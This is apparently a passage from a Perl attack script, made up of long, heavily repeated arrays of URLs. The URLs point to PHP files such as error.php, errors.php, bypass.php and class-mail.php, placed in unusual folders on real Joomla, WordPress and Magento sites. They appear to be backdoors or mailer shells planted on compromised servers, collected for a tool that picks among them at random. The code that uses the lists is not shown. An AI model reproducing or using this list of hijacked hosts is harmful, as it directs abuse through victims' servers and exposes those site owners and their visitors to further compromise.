"http://www.asesoriaentesis.com/components/com_mailto/error.php",
"http://www.pebk.de/joomla/components/com_mailto/error.php",
"http://www.atopsuccess.com//plugins/editors/error.php",
"http://islamone.org/flash/errors.php",
"http://pnpdistribuidora.com.br//erros/errors.php",
"http://ancoimbra.net//media/errors.php",
"http://heb.smart-test.co.il/errors.php",
"http://www.thomastyreperu.com//plugins/errors.php",
"http://soosh-lb.com//errors.php",
"http://eshopbmw.com//skin/adminhtml/default/error.php",
"http://www.mecanica.coppe.ufrj.br/ufrj-em//components/com_media/error.php",
"http://www.iwhatswatch.com//skin/frontend/default/default/images/error.php",
"http://www.imc-egypt.org//cli/error.php",
"http://www.thermona-ekb.ru/errors.php",
"http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://therfw.com/wp-includes/error.php",
"http://www.yplittleport.org.uk/media/system/config.index.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://australiansuperaudit.com.au/errors.php",
"http://www.angola-embassy.nl/errors.php",
"http://www.pece.com.my/2014/wp-content/themes/Avada/framework/error.php",
"http://www.ares-asesores.com/ares/wp-content/languages/error.php",
"http://kontento.eu/wp-content/themes/smartbox-theme/error.php",
"http://arpwegenwaterbouw.nl/wp-content/themes/smartbox-theme/error.php",
"http://vatnedekkservice.no/wp-includes/js/thickbox/class-mail.php",
"http://valentealexvalente.com/alex/wp-includes/error.php",
"http://pnpdistribuidora.com.br//errors.php",
"http://clinicavanity.com.br/2012/wp-includes/error.php",
"citizenofburma.org//plugins/content/errors.php",
"http://choir.louwanjpoujezi.org//plugins/content/errors.php",
"http://gdthuyphuong.free.fr//includes/errors.php",
"https://unique-sportstime.de/shop/skin/install/default/errors.php",
"http://cnsave.koray.cn/errors.php",
"http://www.masterlocksleutelkluis.nl/errors.php",
"http://ecom.wilburhuang.com/errors.php",
"http://demo.ecommerce.facto.cl/magento/1.9/skin/errors.php",
"http://centralcaixas.com/mdf/errors.php",
"http://www.bazardakau.com.br/errors.php",
"http://shardha.in/errors.php",
"http://www.sapphireengagement.co.uk/errors.php",
"http://sifide.gob.mx/errors.php",
"http://www.dibbs.co.za/errors.php",
"http://www.shop.mitrapai.com/skin/errors.php",
"http://dev2.etwebsolutions.com/magento/test/1901/errors.php",
"http://khhalisi.com/media/errors.php",
"http://petbox.in//media/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://therfw.com/wp-includes/error.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://automarket-fortuna.ru/errors.php",
"http://www.cloudipalarm.nl//wp-admin/user/error.php",
"http://box-creative.com/bx//wp-includes/js/swfupload//error.php",
"http://www.sumkimig.ru//phpthumb/error.php",
"http://belvg.info/demo/magento/framershop/skin/frontend/default/error.php",
"http://tsat-dashboard.com/videocache/bypass.php",
"http://newtec.vn//bypass.php",
"http://139.59.69.212/bypass.php",
"http://sweetfeel.sigmacell.in/bypass.php",
"http://www.prikabylove.com/downloader/bypass.php",
"http://3dproducts.com.ec/bypass.php",
"http://www.heliboss.com.mx//skin/bypass.php",
"http://www.chemistlanes.com/bypass.php",
"http://zend.secl.com.ua/media/bypass.php",
"http://www.vonora.net/bypass.php",
"http://www.motisa.com/bypass.php",
"https://gpscsomagok.hu/skin/bypass.php",
"http://www.studiofifteen.in/errors.php",
"http://daddivamoda.com.br/bypass.php",
"http://hoponhopoff.ge//errors.php",
"http://www.mirabalcenter.org//errors.php",
"http://virtual-aerospace.co.jp//errors.php",
"http://www.flowershop-neo.com/wp-includes/error.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://celticdesire.com//components/com_admintools.backup.8125814a31f9f71dc788a351c9ffb5d8/class-mail.php",
"http://ivanous.free.fr/camu_s_world/images/stories/jump.php",
"http://www.pessebristassumpcio.com/wp-includes/error.php",
"http://www.pricepaving.com//wp-includes/js/plupload/index.php",
"http://www.travelpointer.ro//wp-includes/js/plupload/index.php",
"http://www.zsp.karpacz.pl//libraries/joomla/document/index.php",
"http://www.studio-aid.it//libraries/joomla/database/index.php",
"http://www.corteganamedieval.com/components/com_content/views/section/tmpl/page-sidebar.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://www.orfej.si/components/com_mailto/error.php",
"http://mozaika-mira.ru//media/system/js/error.php",
"http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://www.dileeponline.com/errors.php",
"http://www.atopsuccess.com//plugins/editors/error.php",
"http://hi.ctust.edu.tw/medicalcontest//components/com_mailto/error.php",
"http://p.istu.ru//components/com_mailto/error.php",
"http://www.telsonet.pl/errors.php",
"http://turkishonline.ru//media/system/js/error.php",
"http://vdfs.ru//plugins/editors/error.php",
"http://www.cchm.ca/components/com_mailto/error.php",
"http://www.ele-eme.com.mx/error.php",
"http://virtualmacompetition.com//error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://www.bortolotto.eu/plugins/editors/error.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://www.photodesign.uncanny.cz/images/error.php",
"http://chaoscollective.in/administrator/components/com_weblinks/views/errors.php",
"http://valentealexvalente.com/alex/wp-includes/error.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.sbagro.org.br/modules/mod_login/error.php",
"http://deangelisviaggi.it//wp-admin/network/error.php",
"http://www.elado.ro//xmlrpc/error.php",
"http://www.oem-dealer-parts.ca//components/com_media/error.php",
"http://blog.eurostargym.com/wp-includes/js/thickbox/class-mail.php",
"http://quadrabrain.com//wp-admin/error.php",
"http://milesnation.com/whitney/css/error.php",
"http://therfw.com/wp-includes/error.php",
"http://www.gardenmachinery.ie/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://rothwellscouts.com/media/mailto/error.php",
"http://www.cocofashion.com.au/errors.php",
"http://www.alexgretter.com/google.php",
"http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php",
"http://www.modelismonaval.com/components/com_user/class-mail.php",
"http://www.thewigmall.com/errors.php",
"http://www.allcam.org/errors.php",
"http://circuitec.com.br/errors.php",
"http://www.theatresprives.com/errors.php",
"http://sufbellman.dk/media/error.php"

);

my @random7  = ("www.beslistfietsen.nl/errors.php",
"citizenofburma.org//plugins/content/errors.php",
"http://choir.louwanjpoujezi.org//plugins/content/errors.php",
"http://gdthuyphuong.free.fr//includes/errors.php",
"http://cnsave.koray.cn/errors.php",
"http://www.masterlocksleutelkluis.nl/errors.php",
"http://ecom.wilburhuang.com/errors.php",
"http://demo.ecommerce.facto.cl/magento/1.9/skin/errors.php",
"http://zamzamsweets.in/errors.php",
"http://centralcaixas.com/mdf/errors.php",
"http://www.bazardakau.com.br/errors.php",
"http://shardha.in/errors.php",
"http://www.sapphireengagement.co.uk/errors.php",
"http://www.dvdmall.us/errors.php",
"http://sifide.gob.mx/errors.php",
"http://www.dibbs.co.za/errors.php",
"http://www.shop.mitrapai.com/skin/errors.php",
"http://www.rotarymowers.com.au/errors.php",
"http://printi.be/errors.php",
"http://dev2.etwebsolutions.com/magento/test/1901/errors.php",
"http://khhalisi.com/media/errors.php",
"http://petbox.in//media/errors.php",
"http://orcastudio.co/blog/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://therfw.com/wp-includes/error.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://www.anz.udo.edu.ve/components/com_mailto/error.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://automarket-fortuna.ru/errors.php",
"http://www.cloudipalarm.nl//wp-admin/user/error.php",
"http://box-creative.com/bx//wp-includes/js/swfupload//error.php",
"http://www.sumkimig.ru//phpthumb///error.php",
"http://www.decorvega.es/bypass.php",
"http://belvg.info/demo/magento/framershop/skin/frontend/default/error.php",
"http://re-bel.org//bypass.php",
"http://tsat-dashboard.com/videocache/bypass.php",
"http://newtec.vn//bypass.php",
"http://friendsofradstockrailwayland.org/upload/bypass.php",
"http://139.59.69.212/bypass.php",
"http://sweetfeel.sigmacell.in/bypass.php",
"http://www.prikabylove.com/downloader/bypass.php",
"http://3dproducts.com.ec/bypass.php",
"http://techno.pk/skin/bypass.php",
"http://www.heliboss.com.mx//skin/bypass.php",
"http://www.chemistlanes.com/bypass.php",
"http://kenthecomicman.com/bypass.php",
"http://zend.secl.com.ua/media/bypass.php",
"http://www.vonora.net/bypass.php",
"http://www.motisa.com/bypass.php",
"http://sumaho-print.net//bypass.php",
"https://gpscsomagok.hu/skin/bypass.php",
"http://laptopcity.co.nz/bypass.php",
"http://www.studiofifteen.in/errors.php",
"http://daddivamoda.com.br/bypass.php",
"http://hoponhopoff.ge//errors.php",
"http://www.mirabalcenter.org//errors.php",
"http://virtual-aerospace.co.jp//errors.php",
"http://www.flowershop-neo.com/wp-includes/error.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://celticdesire.com//components/com_admintools.backup.8125814a31f9f71dc788a351c9ffb5d8/class-mail.php",
"http://ivanous.free.fr/camu_s_world/images/stories/jump.php",
"http://www.pessebristassumpcio.com/wp-includes/error.php",
"http://www.kittfoundation.org//wp-includes/js/plupload/index.php",
"http://www.pricepaving.com//wp-includes/js/plupload/index.php",
"http://www.travelpointer.ro//wp-includes/js/plupload/index.php",
"http://www.zsp.karpacz.pl//libraries/joomla/document/index.php",
"http://www.studio-aid.it//libraries/joomla/database/index.php",
"http://www.corteganamedieval.com/components/com_content/views/section/tmpl/page-sidebar.php",
"http://www.pebk.de/joomla/components/com_mailto/error.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://www.orfej.si/components/com_mailto/error.php",
"http://mozaika-mira.ru//media/system/js/error.php",
"http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://www.dileeponline.com/errors.php",
"http://www.atopsuccess.com//plugins/editors/error.php",
"http://hi.ctust.edu.tw/medicalcontest//components/com_mailto/error.php",
"http://p.istu.ru//components/com_mailto/error.php",
"http://www.telsonet.pl/errors.php",
"http://turkishonline.ru//media/system/js/error.php",
"http://vdfs.ru//plugins/editors/error.php",
"http://www.iestpjasdc.edu.pe/contabilidad/components/com_mailto/error.php",
"http://www.cchm.ca/components/com_mailto/error.php",
"http://www.ele-eme.com.mx/error.php",
"http://virtualmacompetition.com//error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://www.bortolotto.eu/plugins/editors/error.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://www.photodesign.uncanny.cz/images/error.php",
"http://chaoscollective.in/administrator/components/com_weblinks/views/errors.php",
"http://valentealexvalente.com/alex/wp-includes/error.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.sbagro.org.br/modules/mod_login/error.php",
"http://deangelisviaggi.it//wp-admin/network/error.php",
"http://www.elado.ro//xmlrpc/error.php",
"http://www.oem-dealer-parts.ca//components/com_media/error.php",
"http://blog.eurostargym.com/wp-includes/js/thickbox/class-mail.php",
"http://shop.stroiportal.kz/cgi-bin/error.php",
"http://www.mecanica.ufrj.br/ufrj-em//components/error.php",
"http://www.t1site.com.br/wp-admin/error.php",
"http://quadrabrain.com//wp-admin/error.php",
"http://milesnation.com/whitney/css/error.php",
"http://therfw.com/wp-includes/error.php",
"http://www.gardenmachinery.ie/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://rothwellscouts.com/media/mailto/error.php",
"http://www.ehbo-eelde.nl/media/error.php",
"http://www.cocofashion.com.au/errors.php",
"http://www.alexgretter.com/google.php",
"http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php",
"http://www.modelismonaval.com/components/com_user/class-mail.php",
"http://www.thewigmall.com/errors.php",
"http://www.solucionesparati.net/CMS2008/images/error.php",
"http://www.allcam.org/errors.php",
"http://totalfish.hu/errors.php",
"http://circuitec.com.br/errors.php",
"http://www.theatresprives.com/errors.php",
"http://wesotech.com/contact/google.php",
"http://moreketing.mx/errors.php",
"http://sufbellman.dk/media/error.php",
"http://www.mariobabiera.com/google.php",
"http://jhealthy.com/jhome//wp-admin/error.php",
"http://virtual-aerospace.co.jp/errors.php",
"http://www.studiogross.com.br/web/wp-includes/error.php",
"http://pastorbonus.sk/errors.php",
"http://test.stramed.com.tr/errors.php",
"http://metroway.com/wp-includes/ID3/proxy.php",
"http://www.psdf.org.pk/errors.php",
"http://iheld.com/errors.php",
"http://bohealth.eu/media/com_jantivirus/css/index.php",
"http://www.musetti.eu/errors.php",
"http://pngk.kz/media/media/css/index.php",
"http://www.yplittleport.org.uk/media/system/config.index.php",
"http://www.lincos.si/components/com_banners/models/error.php",
"http://eventos.unisangil.edu.co/media/media/css/index.php",
"http://www.shturmovoi.ru/components/com_mailto/error.php",
"http://www.kawaiishop.fr/var/pass/search.php",
"http://lisarkent.com/errors.php",
"http://savvyschools.ie/wp-includes/images/pass/script-loader.php",
"http://www.bespoke-valeting.co.uk/wp-includes/error.php",
"http://www.tkofschip.be/joomlasites/ankerintranet5/plugins/content/config.index.php",
"http://blizzsozz.com/errors.php",
"http://www.conradel.com/errors.php",
"http://www.jaguarcarclubofwa.com.au/jaguarcarclubofwa/images/error.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://www.asesoriaentesis.com/components/com_mailto/error.php",
"http://dom-sad-ogorod.ru/plugins/search/config.inc.php",
"http://kavkazinterpress.ru/plugins/content/config.inc.php",
"http://www.dom-sad-ogorod.ru/plugins/search/config.inc.php",
"http://www.pkstorages.com//plugins/content/seka.php",
"http://www.3freebids.com/error.php",
"http://www.rateavon.je/error.php",
"http://dateakademie.de/wp-includes/error.php",
"http://www.cannell-immobilier.com/errors.php",
"http://themansphere.com/wp-includes/error.php",
"http://hoponhopoff.ge/errors.php",
"http://directproducts.co.zw/errors.php",
"http://www.acdt-manutention.fr/errors.php",
"http://www.semneartemis.ro/images/errors.php",
"http://www.anz.udo.edu.ve/components/com_mailto/error.php",
"http://www.thermona-ekb.ru/errors.php", 
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://mozaika-mira.ru//media/system/js/error.php",
"http://www.asesoriaentesis.com/components/com_mailto/error.php",
"http://www.pebk.de/joomla/components/com_mailto/error.php",
"http://www.atopsuccess.com//plugins/editors/error.php",
"http://islamone.org/flash/errors.php",
"http://pnpdistribuidora.com.br//erros/errors.php",
"http://ancoimbra.net//media/errors.php",
"http://heb.smart-test.co.il/errors.php",
"http://www.thomastyreperu.com//plugins/errors.php",
"http://soosh-lb.com//errors.php",
"http://eshopbmw.com//skin/adminhtml/default/error.php",
"http://www.mecanica.coppe.ufrj.br/ufrj-em//components/com_media/error.php",
"http://www.iwhatswatch.com//skin/frontend/default/default/images/error.php",
"http://www.imc-egypt.org//cli/error.php",
"http://www.thermona-ekb.ru/errors.php",
"http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://therfw.com/wp-includes/error.php",
"http://www.yplittleport.org.uk/media/system/config.index.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://australiansuperaudit.com.au/errors.php",
"http://www.angola-embassy.nl/errors.php",
"http://www.pece.com.my/2014/wp-content/themes/Avada/framework/error.php",
"http://www.ares-asesores.com/ares/wp-content/languages/error.php",
"http://kontento.eu/wp-content/themes/smartbox-theme/error.php",
"http://arpwegenwaterbouw.nl/wp-content/themes/smartbox-theme/error.php",
"http://vatnedekkservice.no/wp-includes/js/thickbox/class-mail.php",
"http://valentealexvalente.com/alex/wp-includes/error.php",
"http://pnpdistribuidora.com.br//errors.php",
"http://clinicavanity.com.br/2012/wp-includes/error.php",
"http://www.starcom1.eu/skin/adminhtml/error.php",
"http://zlotohiszpanii.pl/skin/adminhtml/error.php",
"http://king-solarman.com/skin/adminhtml/base/error.php",
"http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php",
"http://www.modelismonaval.com/components/com_user/class-mail.php",
"http://www.karpet.cz/media/system/js/jquery.php",
"http://www.rateavon.je/error.php",
"http://dateakademie.de/wp-includes/error.php",
"http://www.cannell-immobilier.com/errors.php",
"http://circuitec.com.br/errors.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://themansphere.com/wp-includes/error.php",
"http://www.cloudipalarm.nl/wp-content/plugins/revslider/temp/errors.php",
"http://hoponhopoff.ge/errors.php",
"http://directproducts.co.zw/errors.php",
"http://www.acdt-manutention.fr/errors.php",
"http://www.thewigmall.com/errors.php",
"http://www.semneartemis.ro/images/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://turkishonline.ru//media/system/js/error.php",
"http://www.addisyouth.org.et/components/com_mailto/error.php",
"http://www.asesoriaentesis.com/components/com_mailto/error.php",
"http://www.shturmovoi.ru/components/com_mailto/error.php",
"http://www.pebk.de/joomla/components/com_mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php",
"http://www.dom-sad-ogorod.ru/plugins/search/config.inc.php",
"http://p.istu.ru//components/com_mailto/error.php",
"http://www.telsonet.pl/errors.php",
"http://www.tcfa1.net/errors.php",
"http://www.iestpjasdc.edu.pe/contabilidad/components/com_mailto/error.php",
"http://www.cchm.ca/components/com_mailto/error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://www.bortolotto.eu/plugins/editors/error.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://rothwellscouts.com/media/mailto/error.php",
"http://www.photodesign.uncanny.cz/images/error.php",
"http://chaoscollective.in/administrator/components/com_weblinks/views/errors.php",
"http://www.deltadunariilive.ro/wp-content/errors.php",
"http://fisioleste.com.br/wp-admin/errors.php",
"http://resources.opth1jobs.com//modules/errors.php",
"http://www.propertydd4u.com//errors.php",
"http://www.skipperdean.com//media/errors.php",
"http://www.baskingshark.ie//media/errors.php",
"http://flirtbogota.co/web3//media/errors.php",
"http://gaysm.pl/media/errors.php",
"http://www.baliste-club.org//media/errors.php",
"http://tbilisi-portal.com//tmp/errors.php",
"http://store.setar.aw/errors.php",
"http://www.pokal-royal.de//js/errors.php",
"http://www.fiesta-del-sol.fr//errors.php",
"http://ethnikometopo.gr//tmp/errors.php",
"http://newlifebiblechurch.org//media/errors.php",
"http://www.cjbg.ma/errors.php",
"http://donghohanghieu.diemnhan.net//errors.php",
"http://inovatyonconsorcio.com.br/errors.php",
"http://www.toprace.co.uk/errors.php",
"http://pretty-talk.com//js/lib/errors.php",
"http://ifeed.co.kr//errors.php",
"http://abcofficemoveis.com.br/novo/media/errors.php",
"http://www.gramophoneshop.nl/webshop//skin/frontend/default/errors.php",
"http://prweb.com.sg/maimee/errors.php",
"http://bkd.bimakota.go.id//wp-admin/css/colors/blue/errors.php",
"http://www.siambeautyonline.com//errors.php",
"http://www.supon.tech//skin/adminhtml/default/default/images/moneybookers/errors.php",
"http://www.icomplementi.com/picture_library/errors.php",
"http://gaysm.pl/flash/modules/global/js/errors.php",
"http://www.chrontel.com/skin/adminhtml/default/default/lib/prototype/windows/themes/magento/.../errors.php",
"http://www.internetrights.in/wp-content/plugins/contact-form-7/images/service-icons/errors.php",
"http://virtual-aerospace.co.jp//errors.php",
"http://mrsteamers.com//wp-content/plugins/errors.php",
"http://onlineordering.alumaxshowerdoor.com/skin/frontend/errors.php",
"http://www.chispazorumbas.com//plugins/errors.php",
"http://projects.kurinjiemedia.com/singlemovie//wp-content/plugins/errors.php",
"http://pasionporlajusticia.com/2015//wp-content/plugins/errors.php",
"http://www.younik.co/skin/frontend/errors.php",
"http://www.fedir.it//components/com_mailto/views/mailto/errors.php",
"http://www.copati.org.br//images/jdownloads/screenshots/thumbnails/errors.php",
"http://tuva-church.com/slovo//wp-content/plugins/dzs-videogallery/errors.php",
"http://morada.com.ve/newsite//wp-content/plugins/dzs-videogallery/errors.php",
"http://cmtactical.com//skin/install/default/default/errors.php",
"http://oldfashionedman.com//errors.php",
"http://ajansfestival.com/wp-admin/user/error.php",
"http://box-creative.com/bx//wp-includes/js/swfupload//error.php",
"http://tricotrico.com/wp-includes/error.php",
"http://www.shg-vaskulitis-eifel-mosel.de//forum/style/portal/error.php",
"http://nutritie-wellness.ro/var/package/tmp/error.php",
"http://pngk.kz/media/media/css/index.php",
"http://www.3freebids.com/error.php",
"http://www.rateavon.je/error.php",
"http://dateakademie.de/wp-includes/error.php",
"http://themansphere.com/wp-includes/error.php",
"https://www.cloudipalarm.nl/wp-content/plugins/revslider/temp/errors.php",
"http://directproducts.co.zw/errors.php",
"http://www.acdt-manutention.fr/errors.php",
"http://www.semneartemis.ro/images/errors.php",
"http://hi.ctust.edu.tw/medicalcontest//components/com_mailto/error.php",
"http://www.lupetticonsultoria.com.br//kellylupetti/errors.php",
"http://redzee.com.au/friends/errors.php",
"http://watchmanreports.com/errors.php",
"http://www.chispazorumbas.com//hwdvideos/errors.php",
"http://islamone.org/errors.php",
"http://hoopsnhiphop.com/errors.php",
"http://www.brasilecon.net/skin/errors.php",
"http://redzee.com.au/friends/inc/classes/errors.php",
"http://shoppershopee.com/errors.php",
"http://xoxofimp.com//errors.php",
"http://islamone.org/flash/errors.php",
"http://www.lmcreativedesign.com.br/wp-content/plugins/errors.php",
"http://heb.smart-test.co.il/errors.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://www.yplittleport.org.uk/media/system/config.index.php",
"http://www.thermona-ekb.ru/errors.php",
"http://clinicavanity.com.br/2012/wp-includes/error.php",
"http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php",
"http://australiansuperaudit.com.au/errors.php",
"http://www.ares-asesores.com/ares/wp-content/languages/error.php",
"http://vatnedekkservice.no/wp-includes/js/thickbox/class-mail.php",
"http://www.jhanjhatfree.com//skin/frontend/base/errors.php",
"http://kontento.eu/wp-content/themes/smartbox-theme/error.php",
"http://valentealexvalente.com/alex/wp-includes/error.php",
"http://therfw.com/wp-includes/error.php",
"http://representacoesdasa.com.br/wp-admin/errors.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.gardenmachinery.ie/errors.php",
"http://www.telsonet.pl/errors.php",
"http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php",
"http://pastorbonus.sk/errors.php",
"http://rothwellscouts.com/media/mailto/error.php",
"http://www.pebk.de/joomla/components/com_mailto/error.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://www.imakecollege.com:37001//plugins/editors/errors.php",
"http://imotionasia.com.vn/errors.php",
"http://www.theatresprives.com/errors.php",
"http://www.pece.com.my/2014/wp-content/themes/Avada/framework/error.php",
"http://moreketing.mx/errors.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://www.psdf.org.pk/errors.php",
"http://www.asesoriaentesis.com/components/com_mailto/error.php",
"http://www.modelismonaval.com/components/com_user/class-mail.php",
"http://www.sbagro.org.br/modules/mod_login/error.php",
"http://p.istu.ru//components/com_mailto/error.php",
"http://circuitec.com.br/errors.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://www.musetti.eu/errors.php",
"http://www.bespoke-valeting.co.uk/wp-includes/error.php",
"http://bohealth.eu/media/com_jantivirus/css/index.php",
"http://www.thewigmall.com/errors.php",
"https://www.aavamobile.com/modules/mod_search/index.php",
"http://virtual-aerospace.co.jp/errors.php",
"http://www.studiogross.com.br/web/wp-includes/error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://www.cocofashion.com.au/errors.php",
"http://www.tkofschip.be/joomlasites/ankerintranet5/plugins/content/config.index.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://www.cannell-immobilier.com/errors.php",
"http://savvyschools.ie/wp-includes/images/pass/script-loader.php",
"http://sufbellman.dk//errors.php",
"http://printfastt.com.br/errors.php",
"http://metroway.com/wp-includes/ID3/proxy.php",
"http://www.kawaiishop.fr/var/pass/search.php",
"http://jhealthy.com/jhome//wp-admin/error.php",
"http://turkishonline.ru//media/system/js/error.php",
"http://www.photodesign.uncanny.cz/images/error.php",
"http://chaoscollective.in/administrator/components/com_weblinks/views/errors.php",
"http://www.bortolotto.eu/plugins/editors/error.php",
"http://www.cchm.ca/components/com_mailto/error.php",
"http://www.jaguarcarclubofwa.com.au/jaguarcarclubofwa/images/error.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://blizzsozz.com/errors.php",
"http://celticdesire.com//components/com_admintools.backup.8125814a31f9f71dc788a351c9ffb5d8/class-mail.php",
"http://www.mirabalcenter.org//errors.php",
"http://www.pessebristassumpcio.com/wp-includes/error.php",
"http://ivanous.free.fr/camu_s_world/images/stories/jump.php",
"http://www.pricepaving.com//wp-includes/js/plupload/index.php",
"http://www.corteganamedieval.com/components/com_content/views/section/tmpl/page-sidebar.php",
"http://www.zsp.karpacz.pl//libraries/joomla/document/index.php",
"http://www.shturmovoi.ru/components/com_mailto/error.php",
"http://www.studio-aid.it//libraries/joomla/database/index.php",
"http://hoponhopoff.ge//errors.php",
"http://cnsave.koray.cn/errors.php",
"http://www.masterlocksleutelkluis.nl/errors.php",
"http://ecom.wilburhuang.com/errors.php",
"http://demo.ecommerce.facto.cl/magento/1.9/skin/errors.php",
"http://zamzamsweets.in/errors.php",
"http://centralcaixas.com/mdf/errors.php",
"http://www.bazardakau.com.br/errors.php",
"http://shardha.in/errors.php",
"http://www.sapphireengagement.co.uk/errors.php",
"http://www.dvdmall.us/errors.php",
"http://sifide.gob.mx/errors.php",
"http://www.dibbs.co.za/errors.php",
"http://www.shop.mitrapai.com/skin/errors.php",
"http://www.rotarymowers.com.au/errors.php",
"http://printi.be/errors.php",
"http://dev2.etwebsolutions.com/magento/test/1901/errors.php",
"http://khhalisi.com/media/errors.php",
"http://petbox.in//media/errors.php",
"http://orcastudio.co/blog/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://therfw.com/wp-includes/error.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://www.anz.udo.edu.ve/components/com_mailto/error.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://automarket-fortuna.ru/errors.php",
"http://www.cloudipalarm.nl//wp-admin/user/error.php",
"http://box-creative.com/bx//wp-includes/js/swfupload//error.php",
"http://www.sumkimig.ru//phpthumb///error.php",
"http://belvg.info/demo/magento/framershop/skin/frontend/default/error.php",
"http://re-bel.org//bypass.php",
"http://tsat-dashboard.com/videocache/bypass.php",
"http://newtec.vn//bypass.php",
"http://friendsofradstockrailwayland.org/upload/bypass.php",
"http://139.59.69.212/bypass.php",
"http://sweetfeel.sigmacell.in/bypass.php",
"http://www.prikabylove.com/downloader/bypass.php",
"http://3dproducts.com.ec/bypass.php",
"http://techno.pk/skin/bypass.php",
"http://www.heliboss.com.mx//skin/bypass.php",
"http://www.chemistlanes.com/bypass.php",
"http://kenthecomicman.com/bypass.php",
"http://zend.secl.com.ua/media/bypass.php",
"http://www.vonora.net/bypass.php",
"http://www.motisa.com/bypass.php",
"http://sumaho-print.net//bypass.php",
"https://gpscsomagok.hu/skin/bypass.php",
"http://laptopcity.co.nz/bypass.php",
"http://hoponhopoff.ge//errors.php",
"http://www.mirabalcenter.org//errors.php",
"http://virtual-aerospace.co.jp//errors.php",
"http://www.flowershop-neo.com/wp-includes/error.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://celticdesire.com//components/com_admintools.backup.8125814a31f9f71dc788a351c9ffb5d8/class-mail.php",
"http://ivanous.free.fr/camu_s_world/images/stories/jump.php",
"http://www.pessebristassumpcio.com/wp-includes/error.php",
"http://www.kittfoundation.org//wp-includes/js/plupload/index.php",
"http://www.pricepaving.com//wp-includes/js/plupload/index.php",
"http://www.travelpointer.ro//wp-includes/js/plupload/index.php",
"http://www.zsp.karpacz.pl//libraries/joomla/document/index.php",
"http://www.studio-aid.it//libraries/joomla/database/index.php",
"http://www.corteganamedieval.com/components/com_content/views/section/tmpl/page-sidebar.php",
"http://www.pebk.de/joomla/components/com_mailto/error.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://imotionasia.com.vn/errors.php",
